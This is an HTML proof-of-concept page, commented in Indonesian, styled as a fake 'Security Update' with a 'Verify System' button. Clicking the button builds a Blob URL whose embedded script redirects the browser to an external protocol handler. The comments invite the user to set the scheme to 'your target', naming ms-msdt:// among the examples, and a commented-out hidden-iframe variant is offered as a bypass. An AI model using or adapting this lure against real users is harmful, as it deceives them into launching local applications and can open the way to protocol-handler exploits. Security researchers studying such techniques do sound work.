<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Update</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #f0f4f8;
    font-family: 'Segoe UI', Arial, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
    text-align: center;
  }
  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
  h1 { color: #333; margin-bottom: 10px; }
  p { color: #666; margin-bottom: 20px; }
  button {
    padding: 15px 30px;
    font-size: 18px;
    background: #007aff;
    color: #fff;
    border: none;
    border-radius: 8px;
    cursor: pointer;
    font-weight: bold;
  }
  button:hover { background: #005bb5; }
  iframe { display: none; }
</style>
</head>
<body>

<div class="panel">
  <h1>🔒 Security Update</h1>
  <p>Klik di bawah untuk melanjutkan verifikasi.</p>
  <button id="startBtn">Verify System</button>
</div>

<script>
(function () {
  'use strict';

  document.getElementById('startBtn').addEventListener('click', function() {
    // ============================================
    // 1. SKEMA TARGET (UBAH SESUAI TARGET ANDA)
    // ============================================
    // Contoh: slack://, mailto:, calculator://, ms-msdt:// (Windows), x-apple.systempreferences://
    var targetScheme = "slack://open"; // Ganti dengan skema yang ingin diuji
    
    console.log("[!] Target Scheme: " + targetScheme);

    // ============================================
    // 2. PAYLOAD HTML (DI DALAM BLOB)
    // ============================================
    // Script di dalam Blob ini yang akan melakukan redirect
    var payloadHTML = `
      <!DOCTYPE html>
      <html>
      <head><title>Redirecting...</title></head>
      <body style="background:#000;color:#fff;font-family:monospace;text-align:center;padding-top:20vh;">
        <h1>Redirecting...</h1>
        <script>
          // Coba redirect langsung dari dalam Blob
          try {
            window.location.href = "${targetScheme}";
          } catch(e) {}
        <\/script>
      </body>
      </html>
    `;

    // ============================================
    // 3. BUAT BLOB URL
    // ============================================
    var blob = new Blob([payloadHTML], { type: 'text/html' });
    var blobUrl = URL.createObjectURL(blob);

    console.log("[!] Blob URL dibuat: " + blobUrl);

    // ============================================
    // 4. TRIGGER REDIRECT (BATU LONCATAN)
    // ============================================
    // Kita navigasi tab ke URL Blob. Begitu dimuat, script di dalam Blob
    // akan mengeksekusi redirect ke skema eksternal.
    window.location.href = blobUrl;

    // Opsional: Jika ingin mencoba bypass lewat iframe tersembunyi
    /*
    var iframe = document.createElement('iframe');
    iframe.src = blobUrl;
    document.body.appendChild(iframe);
    */
  });

})();
</script>
</body>
</html>
